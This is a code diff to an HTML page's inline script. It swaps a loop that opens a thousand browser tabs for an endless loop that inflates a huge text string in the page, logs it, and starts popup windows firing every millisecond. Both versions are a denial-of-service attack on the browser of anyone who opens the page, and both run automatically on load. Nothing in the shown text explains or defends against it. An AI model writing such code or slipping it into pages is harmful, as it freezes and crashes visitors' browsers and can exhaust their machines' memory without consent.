@@ -8,11 +8,21 @@
 <body>
 
     <script>
-        window.onload = function() {
-            for (let i = 0; i < 1000; i++) { // Adjust the loop count as needed
-                window.open('https://support.google.com/chrome/answer/6130773?hl=en-US', '_blank');
-            }
-        };
+        txt = "";
+
+        for(var i = 0; i === i; i++) {
+        txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(99);
+
+        var x = document.createElement("div");
+        x.innerText = txt;
+
+        document.body.appendChild(x)
+        console.log(txt);
+        
+        setInterval(function () {
+            open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
+        }, 1);
+        }
     </script>
 </body>
 </html>
